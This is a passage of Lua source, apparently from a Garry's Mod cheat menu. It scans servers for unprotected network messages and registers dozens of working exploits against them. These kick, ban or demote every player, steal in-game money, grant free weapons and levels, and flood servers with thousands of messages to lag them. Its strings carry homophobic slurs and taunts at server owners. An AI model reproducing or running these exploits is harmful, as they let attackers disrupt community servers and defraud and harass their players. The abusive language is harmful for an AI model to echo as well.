net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
end
end )
end

status = ValidNetString("VoteBanNO")
if (status) then
ECPrint("Found Exploit: Voteban [VoteBanNO]")
addExploit( "38","Voteban", "bans all", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do 
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
end
end )
end

status = ValidNetString("NewReport")
if (status) then
ECPrint("Found Exploit: Custom Report [NewReport]")
addExploit( "39","Custom Report", "Report all faggots", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do  
net.Start("NewReport")
net.WriteType(ply)
net.WriteInt(8,5)
net.WriteString("hahaha")
net.SendToServer()
end
end )
end

status = ValidNetString("Warn_CreateWarn")
if (status) then
ECPrint("Found Exploit: Custom Warn [Warn_CreateWarn]")
addExploit( "40","Custom Warn", "Warn all faggots", function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do 
net.Start("Warn_CreateWarn")
net.WriteEntity(ply)
net.WriteString("hahaha")
net.SendToServer()
end
end )
end

status = ValidNetString("showDisguiseHUD")
if (status) then
ECPrint("Found Exploit: Disguise #2 [showDisguiseHUD]")
addExploit( "41","Disguise #2", "allows you to disguise as any job", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECPrint("Choose a disguise")
PlayerCount = 0
for k, v in pairs(player.GetAll()) do
PlayerCount = PlayerCount + 1
end
local TeamNum
local disguise_Model_Preview_Default
local base = vgui.Create("DFrame")
base:SetSize(300,420)
base:Center()
base:SetTitle(" ")
base:ShowCloseButton(false)
base:MakePopup()
function base:Paint()
draw.RoundedBoxEx( 5, 0, 0, base:GetWide(), base:GetTall(), Color(20,20,20,200),false,true)
draw.RoundedBox( 0, 0, 30, base:GetWide(), base:GetTall()-60, Color(10,10,10,200))
draw.RoundedBox( 0, 0, 30, base:GetWide(), 5, Color(255,255,255,255))
draw.RoundedBox( 0, 0, 390, base:GetWide(), 5, Color(255,255,255,255))
draw.SimpleText("Disguise", "DisFontBold", base:GetWide()/4, -1)
end
local ExitButton = vgui.Create("DButton", base)
ExitButton:SetPos(base:GetWide()+4-ExitButton:GetWide())
ExitButton:SetText("Close")
ExitButton:SetSize(60,20)	
ExitButton:SetFont("DermaDefaultBold")
ExitButton.Paint = function()
if ExitButton.Hovered then
if ExitButton:IsDown() then
ExitButton:SetTextColor(Color(200,200,200,200))
draw.RoundedBoxEx(5,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,0,0,200),false,true)
else
ExitButton:SetTextColor(Color(255,255,255,255))
draw.RoundedBoxEx(5,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,0,0,255),false,true)
end
else
ExitButton:SetTextColor(Color(20,20,20,200))
draw.RoundedBoxEx(5,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(200,0,0,200),false,true)
end
end
function ExitButton.DoClick()
base:Remove()
net.Start("changeToPhysgun")
net.SendToServer()
end
local DTeamChoice = vgui.Create("DComboBox", base)
DTeamChoice:SetSize(150, 22)
DTeamChoice:SetPos(75, 50)
DTeamChoice:SetValue("Select Job")
for k, v in pairs(team.GetAllTeams()) do
if !(HIDDEN_TEAMS[ k ] ) and (team.NumPlayers(k) ~= 0) then DTeamChoice:AddChoice(team.GetName(k)) end
end
DTeamChoice.OnSelect = function(panel, index, value)
for k,_ in pairs(team.GetAllTeams()) do
if value == team.GetName(k) then
for _, v in pairs(player.GetAll())do
if v:Team() == k then
TeamNum = v:Team()
disguise_Model_Preview_Default = v:GetModel()
end
end
end
end
timer.Create("RefreshModel", 0.1, 0, function()
local icon = vgui.Create( "DModelPanel", base )
icon:SetSize(300, 260)
icon:SetPos(-5, 80)
icon:SetFOV(68)
icon:SetModel( disguise_Model_Preview_Default )
timer.Simple(0.1, function()
icon:Remove()
end)
end)
local DisguiseButton = vgui.Create("DButton", base)
DisguiseButton:SetPos(base:GetWide()/2.5, 360)
DisguiseButton:SetSize(60,20)
DisguiseButton:SetText("Accept")
DisguiseButton:SetFont("DermaDefaultBold")
function DisguiseButton:Paint()
if DisguiseButton.Hovered then
if DisguiseButton:IsDown() then
DisguiseButton:SetTextColor(Color(200,200,200,200))
draw.RoundedBoxEx(0,0,0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60,200,0,200))
else
DisguiseButton:SetTextColor(Color(255,255,255,255))
draw.RoundedBoxEx(0,0,0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60,220,0,255))
end
else
DisguiseButton:SetTextColor(Color(20,20,20,200))
draw.RoundedBoxEx(0,0,0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60,200,0,255))
end
end
function DisguiseButton:DoClick()
net.Start("SetPlayerModel")
if ChosenName == nil then
net.WriteString(LocalPlayer():Nick())
else
net.WriteString(ChosenName)
end
net.WriteUInt(TeamNum, 16)
net.SendToServer()
base:Close()
net.Start("changeToPhysgun")
net.SendToServer()
end
end
end
)
end
		
status = ValidNetString("Chatbox_PlayerChat")
if (status) then
ECPrint("Found Exploit: WilloxChat Spam [Chatbox_PlayerChat]")
addExploit( "42","WilloxChat Spam", "spam in chat", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("willoxchatspam", 1, 0, function()
net.Start("Chatbox_PlayerChat")
net.WriteEntity(LocalPlayer())
net.WriteBit(1)
net.WriteString("FAGGOTS")
net.WriteBit(1)
net.SendToServer()
end )
end )
end

status = ValidNetString("BuilderXToggleKill")
if (status) then
ECPrint("Found Exploit: BuilderXToggleKill [BuilderXToggleKill]")
addExploit( "43","BuilderXToggleKill", "old exploit, i dont remember what he was doing", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do 
net.Start("BuilderXToggleKill")
net.WriteEntity(ply)
net.SendToServer()
end
end )
end

status = ValidNetString("reports.submit")
if (status) then
ECPrint("Found Exploit: Report All [reports.submit]")
addExploit( "44","Report All", "Report all faggots", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("reports.submit")
net.WriteEntity(v)
net.WriteInt(5, 8)
net.WriteString("SuckMyDick")
net.SendToServer()
end
end )
end

status = ValidNetString("services_accept")
if (status) then
ECPrint("Found Exploit: Infernus Service Accept [services_accept]")
addExploit( "45","Infernus Service Accept", "spam to all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("serviceaccept", 0, 0, function() 
for k,v in pairs(player.GetAll()) do 
net.Start("services_accept")
net.WriteString("Nice security, retards xd")
net.WriteVector(Vector(v:GetPos()))
net.WriteString("test image")
net.WriteEntity(v)
net.SendToServer()
end
end )
timer.Simple(4, function() 
timer.Destroy("serviceaccept")
end )
end )
end

status = ValidNetString("lockpick_sound")
if (status) then
ECPrint("Found Exploit: LockPick Sound Spam [lockpick_sound]")
addExploit( "46","LockPick Sound Spam", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create( "spamlockpicksound", 3, 0, function()
for k, v in pairs( player.GetAll() ) do
net.Start("lockpick_sound")
net.WriteEntity(v)
net.SendToServer()
end
end )
timer.Simple(4, function() 
timer.Destroy("spamlockpicksound")
end )
end )
end

status = ValidNetString("customprinter_get")
if (status) then
ECPrint("Found Exploit: Realistic Printers Steal Money [customprinter_get]")
addExploit( "47","Realistic Printers Steal Money", "stealing money from printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
if v:GetClass():find("print") then
net.Start("customprinter_get")
net.WriteEntity(v)
net.WriteString("g_money")
net.SendToServer()
end
end
end )
end

status = ValidNetString("InformPlayer")
if (status) then
ECPrint("Found Exploit: SimpleGrab Inform [InformPlayer]")
addExploit( "48","SimpleGrab Inform", "Spam all players in the console", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
for i = 0, 100 do 
net.Start("InformPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("pogcp_report_submitReport")
if (status) then
ECPrint("Found Exploit: Report All #2 [pogcp_report_submitReport]")
addExploit( "49","Report All #2", "Report all faggots", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for i = 0, 100 do
for k,v in pairs(player.GetAll()) do 
net.Start("pogcp_report_submitReport")
net.WriteString("lol")
net.WriteString("nice security retards")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("1942_Fuhrer_SubmitCandidacy")
if (status) then
ECPrint("Found Exploit: Fuhrer Submit Candidacy [1942_Fuhrer_SubmitCandidacy]")
addExploit( "50","Fuhrer Submit Candidacy", "you instantly become a Fuhrer, Sieg Heil", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("1942_Fuhrer_SubmitCandidacy")
net.WriteString(LocalPlayer():Nick())
net.SendToServer()
end )
end

status = ValidNetString("FacCreate")
if (status) then
ECPrint("Found Exploit: Fac Create [FacCreate]")
addExploit( "51","Fac Create", "old exploit", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("fucklol", 1, 0, function()
net.Start("FacCreate")
net.WriteString("LOL " .. random_string(5))
net.WriteString("LOL " .. random_string(10))
net.WriteColor(random_color())
net.WriteBool(false)
net.WriteString(random_string(5))
net.SendToServer()
end )
end )
end

status = ValidNetString("FactionInviteConsole")
if (status) then
ECPrint("Found Exploit: Faction Invite [FactionInviteConsole]")
addExploit( "52","Faction Invite", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lovedarkexploitsxd", 1, 0, function()
for k, v in pairs(player.GetAll()) do 
net.Start("FactionInviteConsole")
net.WriteEntity( ply )
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end )
end )
end

status = ValidNetString("WithdrewBMoney")
if (status) then
ECPrint("Found Exploit: Free Money #2 [WithdrewBMoney]")
addExploit( "53","Free Money #2", "an exploit in the addon 'business'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("WithdrewBMoney")
net.WriteInt(50000,32)
net.SendToServer()
end )
end

status = ValidNetString("deathrag_takeitem")
if (status) then
ECPrint("Found Exploit: Easy Items [deathrag_takeitem]")
addExploit( "54","Easy Items", "collects money, weapons", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
count = 0
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "prop_ragdoll" then
count = count + 1 
end
end
if count == 0 then
ECPrint("No items found")
else
ECPrint("Amount of items "..count)
end
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "prop_ragdoll" then
for i=1,10 do
net.Start("deathrag_takeitem")
net.WriteEntity( v )
net.WriteInt(i,16)
net.SendToServer()
end
end
end
end )
end

status = ValidNetString("REPPurchase")
if (status) then
ECPrint("Found Exploit: Heal and Armor [REPPurchase]")
addExploit( "55","Heal and Armor", "armor and hp", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if LocalPlayer():Health() < 99 then
net.Start("REPPurchase")
net.WriteString("HEALTH")
net.SendToServer()
end
if LocalPlayer():Armor() < 99 then
net.Start("REPPurchase")
net.WriteString("ARMOR")
net.SendToServer()
end
end )
end

status = ValidNetString("BTTTStartVotekick")
if (status) then
ECPrint("Found Exploit: Votekick #2 [BTTTStartVotekick]")
addExploit( "56","Votekick #2", "kick all noobs", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("BTTTStartVotekick")
net.Start("_nonDBVMVote")
net.WriteEntity(v)
net.WriteString("")
net.WriteString("1")
net.SendToServer()
end
end
end )
end

status = ValidNetString("Resupply")
if (status) then
ECPrint("Found Exploit: Respawn Equipment [Resupply]")
addExploit( "57","Respawn Equipment", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Resupply")
net.SendToServer()
end )
end

status = ValidNetString("DarkRP_Defib_ForceSpawn")
if (status) then
ECPrint("Found Exploit: Respawn #2 [DarkRP_Defib_ForceSpawn]")
addExploit( "58","Respawn #2", "just respawn", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Respawn")
net.Start("DarkRP_Defib_ForceSpawn")
net.SendToServer()
end )
end

status = ValidNetString("FiremanLeave")
if (status) then
ECPrint("Found Exploit: Fireman Leave [FiremanLeave]")
addExploit( "59","Fireman Leave", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("FiremanLeave")
net.SendToServer()
end )
end

status = ValidNetString("PoliceJoin")
if (status) then
ECPrint("Found Exploit: Join the Police 1 [PoliceJoin]")
addExploit( "60","Join the Police 1", "joining the police", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("PoliceJoin")
net.SendToServer()
end )
end

status = ValidNetString("CreateEntity")
if (status) then
ECPrint("Found Exploit: Create Entity [CreateEntity]")
addExploit( "61","Create Entity", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("CreateEntity")
net.WriteString("sent_arc_atm")
net.WriteFloat(100000000000000000000000000000000000000000000000000)
net.WriteEntity(v) 
net.SendToServer()
end
end )
end

status = ValidNetString("CREATE_REPORT")
if (status) then
ECPrint("Found Exploit: CREATE REPORT [CREATE_REPORT]")
addExploit( "62","CREATE REPORT", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local tab = {
		REPORTER = v:Nick(), 
		REPORTERID = v:SteamID(),
		FAGGOT = v:Nick(),
		FAGGOTID = v:SteamID(),
		INFO = "Say hi to youtube",
		PROOF = "https://www.youtube.com/channel/UCmiP5W8BuaLzzGcJVKORErg"
	}
for k,v in pairs(player.GetAll()) do
net.Start("CREATE_REPORT")
net.WriteTable(tab)
net.SendToServer()
end
end )
end

status = ValidNetString("Hopping_Test")
if (status) then
ECPrint("Found Exploit: Hopping Test [Hopping_Test]")
addExploit( "62","Hopping Test", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("Hopping_Test")
net.WriteEntity(v)
net.WriteString("69.696.696969.69")
net.SendToServer()
end
end )
end

status = ValidNetString("CpForm_Answers")
if (status) then
ECPrint("Found Exploit: Join the Police 2 [CpForm_Answers]")
addExploit( "63","Join the Police 2", "joining the police #2", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end )
end

status = ValidNetString("VehicleUnderglow")
if (status) then
ECPrint("Found Exploit: Vehicle Underglow [VehicleUnderglow]")
addExploit( "64","Vehicle Underglow", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("VehicleUnderglow")
net.SendToServer()
end )
end

status = ValidNetString("OpenGates")
if (status) then
ECPrint("Found Exploit: Open Door #2 [OpenGates]")
addExploit( "65","Open Door #2", "Force open the door you are looking at", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("OpenGates")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end )
end

status = ValidNetString("DemotePlayer")
if (status) then
ECPrint("Found Exploit: Demote All Players [DemotePlayer]")
addExploit( "66","Demote All Players", "Demote all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do
net.Start("DemotePlayer") 
net.WriteString(v:SteamID())
net.SendToServer()
end
end )
end

status = ValidNetString("SendMail")
if (status) then
ECPrint("Found Exploit: Send Mail [SendMail]")
addExploit( "67","Send Mail", "sending mail to all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("SendMail")
net.WriteString("haha nice security retards")
net.WriteString(v:Nick())
net.SendToServer()
end
end )
end

status = ValidNetString("REPAdminChangeLVL")
if (status) then
ECPrint("Found Exploit: Admin Change Level [REPAdminChangeLVL]")
addExploit( "68","Admin Change Level", "free lvl", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("REPAdminChangeLVL")
net.WriteEntity(v)
net.WriteDouble(1090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end
end )
end

status = ValidNetString("BuyUpgradesStuff")
if (status) then
ECPrint("Found Exploit: Buy Upgrades [BuyUpgradesStuff]")
addExploit( "69","Buy Upgrades", "free upgrades", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("BuyUpgradesStuff")
net.WriteString("")
net.WriteFloat(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end )
end


status = ValidNetString("SetTableTarget")
if (status) then
ECPrint("Found Exploit: Set Table Target [SetTableTarget]")
addExploit( "71","Set Table Target", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("SetTableTarget")
net.WriteString("pername")
net.WriteString("perjob")
net.WriteInt(-10000000000000, 32)
net.WriteString("hitmansel")
net.WriteString("Anony.")
net.WriteString("")
net.WriteFloat(0)
net.WriteInt(-10000000000000, 32)
net.SendToServer()
end )
end

status = ValidNetString("UpdateRPUModelSQL")
if (status) then
ECPrint("Found Exploit: Change character model [UpdateRPUModelSQL]")
addExploit( "72","Change character model", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("UpdateRPUModelSQL")
net.WriteString(LocalPlayer():GetEyeTrace().Entity:GetModel())
net.SendToServer()
end )
end



status = ValidNetString("NLR_SPAWN")
if (status) then
ECPrint("Found Exploit: Respawn #3 [NLR_SPAWN]")
addExploit( "79","Respawn #3", "instant revival", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("NLR_SPAWN")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("Kun_ZiptieStruggle")
if (status) then
ECPrint("Found Exploit: Break Handcuffs [Kun_ZiptieStruggle]")
addExploit( "80","Break Handcuffs", "Instantly breaks the handcuffs", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for i=0,30 do 
net.Start("Kun_ZiptieStruggle")
net.SendToServer()
end
end )
end

status = ValidNetString("JB_Votekick")
if (status) then
ECPrint("Found Exploit: Abuses Jailbreak Votekick [JB_Votekick]")
addExploit( "81","Abuses Jailbreak Votekick", "kick all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("JB_Votekick")
net.WriteEntity(v)
net.WriteString("what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? ")
net.SendToServer()
end
end )
end

status = ValidNetString("Letthisdudeout")
if (status) then
ECPrint("Found Exploit: ByB Force Bail [Letthisdudeout]")
addExploit( "82","ByB Force Bail", "exploit on all Byb servers to bail yourself out", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Letthisdudeout")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("opr_withdraw")
if (status) then
ECPrint("Found Exploit: Lagger #14 [opr_withdraw]")
addExploit( "83","Lagger #14", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger14", 0,0, function()
for i = 1, 1000 do
net.Start("opr_withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("NC_GetNameChange")
if (status) then
ECPrint("Found Exploit: Change all names [NC_GetNameChange]")
addExploit( "84","Change all names", "allows you to change the rp names of all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the name")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(false)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "AHAHAHAHAH" )
TextEntry.OnEnter = function( self )
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs( player.GetAll() ) do
net.Start("NC_GetNameChange")
net.WriteEntity(v)
net.WriteString( (self:GetValue()) )
net.WriteString( (self:GetValue()) )
net.SendToServer()
end
end
end )
end

status = ValidNetString("revival_revive_accept")
if (status) then
ECPrint("Found Exploit: Reanimation #2 [revival_revive_accept]")
addExploit( "85","Reanimation #2", "instant revival, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "exploit_revive" ) then
ECNotify( "Enabled" )
timer.Create( "exploit_revive", 0.5, 0, function()
if !LocalPlayer():Alive() then
net.Start("revival_revive_accept")
net.SendToServer()
end
end )
else
timer.Remove( "exploit_revive" )
ECNotify( "Disabled" )
end
end )
end

status = ValidNetString("join_disconnect")
if (status) then
ECPrint("Found Exploit: Lagger #15 [join_disconnect]")
addExploit( "86","Lagger #15", "b1g lags my duder", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if not timer.Exists("lagger15") then
timer.Create("lagger15", 0.5, 0, function()
for i = 1, 3000 do
net.Start("join_disconnect",true)
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end)
else
timer.Remove("lagger15")
ECNotify("Stopping")
end
end )
end

status = ValidNetString("BuyFirstTovar")
if (status) then
ECPrint("Found Exploit: Free Physgun [BuyFirstTovar]")
addExploit( "87","Free Physgun", "get physgun", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Take physgun")
net.Start("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
end )
end

status = ValidNetString("BuySecondTovar")
if (status) then
ECPrint("Found Exploit: Free Gravitygun [BuySecondTovar]")
addExploit( "88","Free Gravitygun", "get gravitygun", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Take gravitygun")
net.Start("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
end )
end

status = ValidNetString("MONEY_SYSTEM_GetWeapons")
if (status) then
ECPrint("Found Exploit: Give Weapons #2 [MONEY_SYSTEM_GetWeapons]")
addExploit( "89","Give Weapons #2", "get weapons", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for i = 1,32 do
net.Start("MONEY_SYSTEM_GetWeapons")
net.WriteInt(i, 8)
net.SendToServer()
end
end )
end

status = ValidNetString("MCon_Demote_ToServer")
if (status) then
ECPrint("Found Exploit: Demote All Players #2 [MCon_Demote_ToServer]")
addExploit( "90","Demote All Players #2", "demote all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("MCon_Demote_ToServer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end )
end

status = ValidNetString("withdrawMoney")
if (status) then
ECPrint("Found Exploit: Steal All Monies #3 [withdrawMoney]")
addExploit( "91","Steal All Monies #3", "withdraw money from all printers, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
net.Start("withdrawMoney")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("withdrawMoney")
if (status) then
ECPrint("Found Exploit: Lagger #16 [withdrawMoney]")
addExploit( "92","Lagger #16", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger16", 0, 0, function()
for i=1,1000 do
net.Start("withdrawMoney",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SyncPrinterButtons76561198027292625")
if (status) then
ECPrint("Found Exploit: Steal All Monies #4 [SyncPrinterButtons76561198027292625]")
addExploit( "93","Steal All Monies #4", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
net.Start("SyncPrinterButtons76561198027292625")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end )
end

status = ValidNetString("gPrinters.retrieveMoney")
if (status) then
ECPrint("Found Exploit: Steal All Monies #5 [gPrinters.retrieveMoney]")
addExploit( "94","Steal All Monies #5", "withdraw money from all printers, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
net.Start("gPrinters.retrieveMoney")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("gPrinters.retrieveMoney")
if (status) then
ECPrint("Found Exploit: Lagger #17 [gPrinters.retrieveMoney]")
addExploit( "95","Lagger #17", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger17", 0, 0, function()
for i=1,1000 do
net.Start("gPrinters.retrieveMoney",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("NGII_TakeMoney")
if (status) then
ECPrint("Found Exploit: Steal All Monies #6 [NGII_TakeMoney]")
addExploit( "96","Steal All Monies #6", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
net.Start("NGII_TakeMoney")
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("money_clicker_withdraw")
if (status) then
ECPrint("Found Exploit: Lagger #18 [money_clicker_withdraw]")
addExploit( "97","Lagger #18", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger18", 0, 0, function()
for i=1,1000 do
net.Start("money_clicker_withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("opr_withdraw")
if (status) then
ECPrint("Found Exploit: Steal All Monies #7 [opr_withdraw]")
addExploit( "98","Steal All Monies #7", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
net.Start("opr_withdraw")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("NET_DoPrinterAction")
if (status) then
ECPrint("Found Exploit: Steal All Monies #8 [NET_DoPrinterAction]")
addExploit( "99","Steal All Monies #8", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
if v:GetClass():find("print") then
net.Start("NET_DoPrinterAction")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteInt(2,16)
net.SendToServer()
end
end
end )
end

status = ValidNetString("tickbooksendfine")
if (status) then
ECPrint("Found Exploit: Ticket Book [tickbooksendfine]")
addExploit( "100","Ticket Book", "allows you to write a fine to all players, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local reasonstable = {"NICE EXPLOIT, RIGHT? https://discord.gg/BszpW92"}
for k, v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("tickbooksendfine")
net.WriteString(v:SteamID())
net.WriteTable(reasonstable)
net.WriteDouble(3000, 32)
net.SendToServer()
end
end
end )
end

status = ValidNetString("SyncPrinterButtons16690")
if (status) then
ECPrint("Found Exploit: Steal All Monies #9 [SyncPrinterButtons16690]")
addExploit( "101","Steal All Monies #9", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("SyncPrinterButtons16690")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
end

status = ValidNetString("withdrawp")
if (status) then
ECPrint("Found Exploit: Steal All Monies #10 [withdrawp]")
addExploit( "102","Steal All Monies #10", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("withdrawp")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("withdrawp")
if (status) then
ECPrint("Found Exploit: Lagger #19 [withdrawp]")
addExploit( "103","Lagger #19", "discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("lagger19", 0, 0, function()
for i=1,1000 do
net.Start("withdrawp",true)
